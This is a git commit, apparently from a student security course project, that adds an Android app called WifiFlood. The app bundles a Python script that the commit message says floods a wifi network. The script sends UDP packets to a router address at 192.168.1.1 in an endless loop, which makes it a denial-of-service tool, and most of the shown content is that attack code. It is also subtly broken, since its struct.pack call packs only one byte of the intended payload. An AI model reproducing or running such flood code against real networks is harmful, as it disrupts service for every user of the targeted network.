b90deaa64c8516ebc1b13caa3d716371e7740315
DigitalDynamics <vengeance10@gmail.com>
2014-04-06 17:26:44 -0400

    Initial push of project
    launches SL4A script to flood wifi network

---
+++ gen/com/example/WifiFlood/BuildConfig.java
@@ -0,0 +1,6 @@
+/** Automatically generated file. DO NOT MODIFY */
+package com.example.WifiFlood;
+
+public final class BuildConfig {
+    public final static boolean DEBUG = true;
+}
---
+++ res/raw/script.py
@@ -0,0 +1,35 @@
+#! /usr/bin/env python
+
+# WifiWipe Request Generation Script
+# Seth Darbyshire 
+# CSE 4471
+# 03.21.2014
+
+import sys, os, socket, struct, string, time, select
+
+# Retrieve the host, port, and filename from the commmand line parameters
+remote_ip = '192.168.1.1'				# The remote host of the server
+remote_port = 80 			# The remote port of the server
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP uses Datagram, but not stream
+	
+#payload = inputFile.read(PAYLOAD_SIZE) # Read the next segment payload
+payload = "aewnocihaol287018j" * 3000
+segment = struct.pack("s", payload)
+ack_num = -1
+
+# Continue to send packets until the program is manually killed
+sequence_num = 0
+while 1:
+	
+	print 'Sending Sequence Number ->',sequence_num
+
+	s.sendto(segment, (remote_ip, remote_port))
+	sequence_num = sequence_num + 1
+
+	# if sequence_num > 15000:
+	# 	sequence_num = 0
+
+# Close the socket and finish execution
+s.close() 
+print 'Finished executing'
